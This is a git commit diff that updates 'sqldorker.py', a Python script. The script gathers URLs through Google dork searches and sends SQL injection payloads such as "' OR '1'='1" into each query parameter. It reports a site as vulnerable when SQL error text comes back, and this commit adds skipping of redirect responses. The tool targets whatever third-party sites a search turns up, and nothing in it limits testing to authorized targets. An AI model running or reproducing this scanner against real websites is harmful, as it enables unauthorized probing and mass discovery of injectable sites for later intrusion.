8dd42df16e43116dfb15a9ec0eb745c3a5890c9c
Unrealisedd <90004000+Unrealisedd@users.noreply.github.com>
2024-08-05 23:08:20 +0200

    Update sqldorker.py
    now checks for redirects

--- sqldorker.py
+++ sqldorker.py
@@ -1,4 +1,5 @@
 import requests
+from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
 from googlesearch import search
 from colorama import init, Fore, Style
 
@@ -7,12 +8,12 @@ init()
 
 def print_banner():
     banner = """
-		Made By Unrealisedd                                     
+        Made By Unrealisedd                                     
     """
     print(Fore.CYAN + banner + Style.RESET_ALL)
 
 def get_google_dorking_parameter():
-    dork = input("Enter the Google dorking parameter (e.g., inurl:\"?id=\"): ")
+    dork = input('Enter the Google dorking parameter (e.g., inurl:"?id="): ')
     return dork
 
 def get_number_of_requests():
@@ -33,15 +34,25 @@ def fetch_urls(dork, num_requests):
     return urls
 
 def is_vulnerable_to_sqli(url):
-    payloads = ["'", '"', "''", '""', "' OR '1'='1", '" OR "1"="1']
-    for payload in payloads:
-        test_url = url + payload
-        try:
-            response = requests.get(test_url, timeout=5)
-            if "syntax error" in response.text.lower() or "mysql" in response.text.lower() or "sql" in response.text.lower():
-                return True
-        except requests.exceptions.RequestException as e:
-            print(f"An error occurred while testing URL: {e}")
+    parsed_url = urlparse(url)
+    query_params = parse_qs(parsed_url.query)
+
+    for param in query_params:
+        for payload in ["'", '"', "''", '""', "' OR '1'='1", '" OR "1"="1']:
+            query_params_copy = query_params.copy()
+            query_params_copy[param] = [payload]
+
+            new_query = urlencode(query_params_copy, doseq=True)
+            test_url = urlunparse((parsed_url.scheme, parsed_url.netloc, parsed_url.path, parsed_url.params, new_query, parsed_url.fragment))
+
+            try:
+                response = requests.get(test_url, timeout=5, allow_redirects=False)
+                if response.status_code in [301, 302, 303, 307, 308]:
+                    continue
+                if "syntax error" in response.text.lower() or "mysql" in response.text.lower() or "sql" in response.text.lower():
+                    return True
+            except requests.exceptions.RequestException as e:
+                print(f"An error occurred while testing URL: {e}")
     return False
 
 def main():
